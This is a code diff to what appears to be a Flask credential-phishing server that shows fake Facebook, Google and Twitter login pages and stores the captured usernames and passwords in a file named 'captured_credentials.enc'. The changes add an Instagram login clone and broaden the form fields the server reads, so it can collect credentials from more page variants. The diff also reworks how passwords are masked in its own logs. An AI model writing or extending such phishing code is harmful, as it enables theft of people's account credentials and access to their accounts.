@@ -51,7 +51,8 @@ CRED_FILENAME = 'captured_credentials.enc'
 TEMPLATE_MAP = {
     'facebook': 'login_facebook.html',
     'google': 'login_google.html',
-    'twitter': 'login_twitter.html'
+    'twitter': 'login_twitter.html',
+    'instagram': 'login_instagram.html' # Added Instagram
 }
 # --- ---
 
@@ -204,8 +205,10 @@ def submit_provider(provider):
         logger.warning(f"Invalid provider in submission URL: '{provider}'", extra=log_extras)
         abort(404)
 
-    username = request.form.get('email') # Assumes 'email' field for username/email/phone
-    password = request.form.get('pass')  # Assumes 'pass' field for password
+    # Accept username/email from either 'username' or 'email' field
+    username = request.form.get('username') or request.form.get('email')
+    # Accept password from either 'password' or 'pass' field
+    password = request.form.get('password') or request.form.get('pass')
 
     # Basic validation
     if not username or not password:
@@ -238,7 +241,13 @@ def submit_provider(provider):
     log_extras_submission['username'] = username
     # DO NOT log the actual password
     logger.info(f"Credential submission attempt received", extra=log_extras_submission)
-    logger.debug(f"Raw form data (password masked): { {k: (v if k != 'pass' else masked_password) for k, v in request.form.items()} }", extra={'request_id': req_id})
+    # Create a dictionary copy for safe logging and mask potential password fields
+    form_data_masked = request.form.to_dict()
+    if 'password' in form_data_masked:
+        form_data_masked['password'] = '*' * len(form_data_masked.get('password', ''))
+    if 'pass' in form_data_masked:
+        form_data_masked['pass'] = '*' * len(form_data_masked.get('pass', ''))
+    logger.debug(f"Raw form data (passwords masked): {form_data_masked}", extra={'request_id': req_id})
 
 
     # Prepare data for encryption (including raw password temporarily)
